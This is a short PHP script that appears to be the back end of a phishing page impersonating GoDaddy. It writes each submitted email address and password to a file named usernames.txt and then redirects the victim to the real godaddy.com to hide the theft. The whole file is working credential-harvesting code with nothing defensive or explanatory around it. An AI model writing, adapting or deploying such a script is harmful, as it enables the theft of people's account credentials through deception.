<?php

file_put_contents("usernames.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Password'] . "\n", FILE_APPEND);
header('Location: https://godaddy.com/');
exit();
